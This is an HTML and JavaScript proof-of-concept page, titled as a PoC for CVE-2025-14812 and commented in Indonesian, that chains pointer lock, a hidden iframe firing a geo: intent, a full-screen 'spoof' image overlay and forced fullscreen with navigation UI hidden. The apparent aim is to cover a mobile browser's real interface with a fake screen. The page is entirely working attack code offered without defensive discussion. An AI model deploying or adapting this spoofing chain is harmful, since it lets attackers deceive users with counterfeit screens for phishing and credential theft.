<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" />
    <title>Ultimate Master PointerLock & CVE-2025-14812 PoC</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0b0e14;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        color: #f0f6fc;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
      }
      .container { text-align: center; max-width: 650px; padding: 20px; box-sizing: border-box; z-index: 10; }
      button {
        width: 100%;
        max-width: 360px;
        padding: 18px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #da3633;
        color: #fff;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(218, 54, 51, 0.4);
        transition: transform 0.1s, background 0.2s;
      }
      button:active { background: #b62324; transform: scale(0.98); }
      .info {
        margin-top: 20px;
        font-size: 13px;
        color: #8b949e;
        font-family: monospace;
        word-break: break-all;
        padding: 0 10px;
      }
      #spoof {
        position: fixed;
        top: 0;
        left: 0;
        width: 100vw;
        height: 100vh;
        object-fit: cover;
        z-index: 99999;
      }
      #pointerLockElement {
        width: 0;
        height: 0;
        position: absolute;
      }
    </style>
    <script>
      // Touch event handlers untuk manajemen fokus/blur input sentuh seluler tingkat lanjut
      addEventListener("touchstart", (event) => {});
      window.ontouchstart = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.focus();
      };
      
      addEventListener("touchend", (event) => {});
      window.ontouchend = (event) => {
        let input = document.getElementById("focusInput");
        if (input) input.blur();
      };
    </script>
  </head>
  <body>
    <!-- Hidden focus management input -->
    <input id="focusInput" style="width: 0px; height: 0px; border: none; outline: none; background: transparent; position: absolute; opacity: 0;" />

    <!-- Elemen Pointer Lock & Fullscreen Container -->
    <div id="pointerLockElement"></div>

    <div id="fullscreenElement">
      <!-- Elemen Gambar Spoof yang menutupi seluruh layar secara absolut -->
      <img id="spoof" style="display: none;" src="spoof.png" alt="Spoof Layer">

      <div class="container" id="mainContainer">
        <button id="execBtn">INITIALIZE ADVANCED POINTERLOCK & BYPASS</button>
        <div class="info" id="statusInfo">Status: Ready for interaction.</div>
      </div>
    </div>

    <script>
      let execButton = document.getElementById("execBtn");
      let statusInfo = document.getElementById("statusInfo");

      execButton.onclick = async function () {
        statusInfo.innerText = "Status: Deploying pointer lock, intent vectors & dialog...";
        this.style.display = "none";

        try {
          // 1. Integrasi Pointer Lock API dengan penanganan Promise yang aman
          let plElement = document.getElementById("pointerLockElement");
          if (plElement && plElement.requestPointerLock) {
            try {
              await plElement.requestPointerLock();
            } catch (err) {
              console.debug("PointerLock deferred/restricted:", err.message);
            }
          }

          // 2. Memicu iframe geo: intent untuk memunculkan dialog sistem secara instan menutupi status bar
          let spoofFrame = document.createElement("iframe");
          spoofFrame.style.display = "none";
          spoofFrame.src = "geo:0,0?q=apple.com";
          document.body.appendChild(spoofFrame);

          statusInfo.innerText = "Status: Dialog active. Deploying visual overlay & locking screen...";

          // 3. Memunculkan elemen gambar spoof secara penuh di atas lapisan dialog
          let spoofImg = document.getElementById("spoof");
          if (spoofImg) {
            spoofImg.style.display = "block";
          }

          // 4. Eksekusi Fullscreen agresif pada kontainer terstruktur dengan navigasi tersembunyi setelah jeda 2 detik
          setTimeout(() => {
            let fsElement = document.getElementById("fullscreenElement") || document.documentElement;
            
            let requestFS = fsElement.requestFullscreen || 
                            fsElement.webkitRequestFullscreen || 
                            fsElement.mozRequestFullScreen || 
                            fsElement.msRequestFullscreen;

            if (requestFS) {
              requestFS.call(fsElement, { navigationUI: "hide" }).catch((err) => {
                console.debug("Fullscreen deferred:", err.message);
              });
            }

            // Menyembunyikan kontainer tombol awal secara permanen
            let container = document.getElementById("mainContainer");
            if (container) {
              container.style.display = "none";
            }
            
            statusInfo.innerText = "Status: PointerLock & Bypass sequence complete. Fullscreen overlay locked.";
          }, 2000);

        } catch (err) {
          statusInfo.innerText = "Status: Critical execution error: " + err.message;
          execButton.style.display = "block";
        }
      };
    </script>
  </body>
</html>
